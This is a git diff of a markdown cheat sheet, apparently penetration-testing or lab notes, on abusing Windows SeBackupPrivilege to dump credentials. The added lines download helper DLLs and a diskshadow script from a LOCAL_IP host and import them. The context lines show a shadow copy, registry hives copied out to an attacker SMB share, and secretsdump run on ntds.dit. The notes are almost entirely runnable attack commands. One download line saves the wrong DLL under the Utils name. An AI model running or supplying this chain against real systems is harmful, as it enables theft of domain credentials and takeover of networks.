@@ -1,7 +1,7 @@
 ---
 title: "SeBackupPrivilege/SeRestorePrivilege"
-date: 2024-7-18
-tags: ["Credential Dumping", "File System", "SeBackupPrivilege", "SeRestorePrivilege", "Windows", "Backup Operators", "Diskshadow"]
+date: 2025-8-1
+tags: ["Credential Dumping", "File System", "SeBackupPrivilege", "SeRestorePrivilege", "Windows", "Backup Operators", "Diskshadow", "SAM", "SECURITY", "SYSTEM", "ntds.dit"]
 ---
 
 ### Abuse #1: Robocopy
@@ -59,7 +59,31 @@ expose %test% x:
 unix2dos vss.dsh
 ```
 
-#### 2. Run vss.dsh
+#### 3. Upload Helpers
+
+```console
+iwr http://<LOCAL_IP>:<LOCAL_PORT>/SeBackupPrivilegeCmdLets.dll -o C:\Programdata\SeBackupPrivilegeCmdLets.dll
+```
+
+```console
+iwr http://<LOCAL_IP>:<LOCAL_PORT>/SeBackupPrivilegeCmdLets.dll -o C:\Programdata\SeBackupPrivilegeUtils.dll
+```
+
+```console
+iwr http://<LOCAL_IP>:<LOCAL_PORT>/vss.dsh -o C:\Programdata\vss.dsh
+```
+
+#### 4. Import Helper Modules
+
+```console
+import-module .\SeBackupPrivilegeCmdLets.dll
+```
+
+```console
+import-module .\SeBackupPrivilegeUtils.dll
+```
+
+#### 5. Run vss.dsh
 
 ```console
 diskshadow /s C:\ProgramData\vss.dsh
@@ -103,7 +127,7 @@ The shadow copy was successfully exposed as x:\.
 ->
 ```
 
-#### 3. Host a SMB Server (In Linux)
+#### 6. Host a SMB Server (In Linux)
 
 ```console
 impacket-smbserver share . -smb2support
@@ -119,7 +143,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 ---[SNIP]---
 ```
 
-#### 4. Copy to Local Linux
+#### 7. Copy to Local Linux
 
 ```console
 net use \\<LOCAL_IP>\share
@@ -146,7 +170,7 @@ reg.exe save hklm\system \\<LOCAL_IP>\share\system
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> reg.exe save hklm\system \\10.10.14.31\share\system
 ```
 
-#### 5. Secrets Dump
+#### 8. Secrets Dump
 
 ```console
 impacket-secretsdump -ntds ntds.dit -system system LOCAL
